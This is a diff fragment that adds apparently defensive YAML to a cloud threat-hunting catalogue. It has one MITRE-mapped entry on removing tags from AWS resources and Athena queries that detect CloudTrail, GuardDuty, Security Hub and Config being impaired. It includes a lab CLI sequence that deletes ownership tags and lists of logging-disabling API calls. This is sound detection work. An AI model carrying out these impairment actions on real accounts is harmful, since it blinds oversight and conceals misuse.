+
+    - id: T3-07
+      api: "any:UntagResource"
+      service: any
+      mitre: T1578
+      tactic: Defense Evasion
+      description: >
+        Removes tags used for environment classification, ownership
+        routing, or SIEM correlation. Alone it is low signal but as
+        part of a cleanup chain (removing Owner, Environment, or
+        CostCenter tags after resource misuse) it is significant.
+      hunt_angle: >
+        Low signal in isolation. Build a correlation rule: if
+        UntagResource appears in the same session as any T1 or T2 call,
+        escalate priority. Also look for bulk untagging of EC2 instances
+        or IAM roles after unusual activity.
+      athena_hint: >
+        eventName IN ('UntagResource','RemoveTags','DeleteTags')
+        AND errorCode IS NULL
+        -- correlate with T1/T2 calls in same sessionToken
+      cli_reproduce: |
+        INSTANCE_ID="i-0123456789abcdef0"  # replace with lab instance
+
+        # 1. View current tags
+        aws ec2 describe-tags \
+          --filters Name=resource-id,Values="$INSTANCE_ID"
+
+        # 2. Remove ownership/environment tags (the cleanup action)
+        aws ec2 delete-tags \
+          --resources "$INSTANCE_ID" \
+          --tags Key=Owner Key=Environment Key=CostCenter
+
+        # 3. Confirm removal
+        aws ec2 describe-tags \
+          --filters Name=resource-id,Values="$INSTANCE_ID"
+
+# ─────────────────────────────────────────────────────────
+# HUNTING QUERIES — Athena / CloudTrail Lake
+# ─────────────────────────────────────────────────────────
+hunting_queries:
+
+  - id: HQ-01
+    name: All T1 impairment calls (successful)
+    description: Catch any of the highest-priority calls succeeding
+    athena_sql: |
+      SELECT
+        eventTime,
+        awsRegion,
+        userIdentity.arn                      AS principal,
+        userIdentity.sessionContext.sessionIssuer.arn AS assumed_role,
+        eventName,
+        sourceIPAddress,
+        requestParameters,
+        errorCode
+      FROM cloudtrail_logs
+      WHERE eventName IN (
+        'StopLogging',
+        'DeleteTrail',
+        'DeleteDetector',
+        'DisassociateMembers',
+        'DeleteMembers',
+        'DisableSecurityHub',
+        'StopConfigurationRecorder',
+        'DeleteConfigurationRecorder',
+        'DeleteConfigRule'
+      )
+        AND errorCode IS NULL
+        AND from_iso8601_timestamp(eventTime)
+              > current_timestamp - interval '7' day
+      ORDER BY eventTime DESC;
+
+  - id: HQ-02
+    name: Session-level chained impairment
+    description: >
+      Find sessions containing 2+ impairment calls — indicates
+      deliberate multi-step defense evasion rather than a single
+      misconfiguration.
+    athena_sql: |
+      WITH impairment_events AS (
+        SELECT
+          userIdentity.sessionContext.attributes.creationDate AS session_start,
+          userIdentity.sessionContext.sessionIssuer.arn       AS role_arn,
+          userIdentity.arn                                    AS principal,
+          eventName,
+          eventTime,
+          awsRegion
+        FROM cloudtrail_logs
+        WHERE eventName IN (
+          'StopLogging','DeleteTrail','UpdateTrail','PutEventSelectors',
+          'DeleteDetector','UpdateDetector','CreateFilter',
+          'DisableSecurityHub','StopConfigurationRecorder',
+          'DeleteLogGroup','PutRetentionPolicy','DeleteFlowLogs',
+          'DisableRule','PutRule'
+        )
+          AND errorCode IS NULL
+          AND from_iso8601_timestamp(eventTime)
+                > current_timestamp - interval '7' day
+      )
+      SELECT
+        session_start,
+        role_arn,
+        principal,
+        count(*)                   AS impairment_call_count,
+        array_agg(eventName)       AS calls,
+        array_agg(awsRegion)       AS regions
+      FROM impairment_events
+      GROUP BY session_start, role_arn, principal
+      HAVING count(*) >= 2
+      ORDER BY impairment_call_count DESC;
+
+  - id: HQ-03
+    name: CloudTrail S3 bucket policy changes
+    description: Detect CT bucket policy modifications (T1-03 / underdetected)
+    note: Requires S3 management events enabled on the CT delivery bucket
+    athena_sql: |
+      SELECT
+        eventTime,
+        userIdentity.arn  AS principal,
+        eventName,
+        requestParameters,
+        sourceIPAddress
+      FROM cloudtrail_logs
+      WHERE eventName IN ('PutBucketPolicy','DeleteBucketPolicy',
+                          'PutBucketLifecycleConfiguration','PutBucketLogging')
+        AND requestParameters.bucketName = '<your-ct-bucket-name>'
+        AND errorCode IS NULL
+        AND from_iso8601_timestamp(eventTime)
+              > current_timestamp - interval '30' day
+      ORDER BY eventTime DESC;
+
+  - id: HQ-04
+    name: GuardDuty finding publication delay
+    description: Detect UpdateDetector calls that slow down finding delivery
+    athena_sql: |
+      SELECT
+        eventTime,
+        userIdentity.arn                    AS principal,
+        requestParameters.findingPublishingFrequency AS new_frequency,
+        awsRegion,
+        sourceIPAddress
+      FROM cloudtrail_logs
+      WHERE eventName = 'UpdateDetector'
+        AND errorCode IS NULL
+        AND requestParameters.findingPublishingFrequency
+              IN ('ONE_HOUR','SIX_HOURS')
+        AND from_iso8601_timestamp(eventTime)
+              > current_timestamp - interval '30' day
+      ORDER BY eventTime DESC;
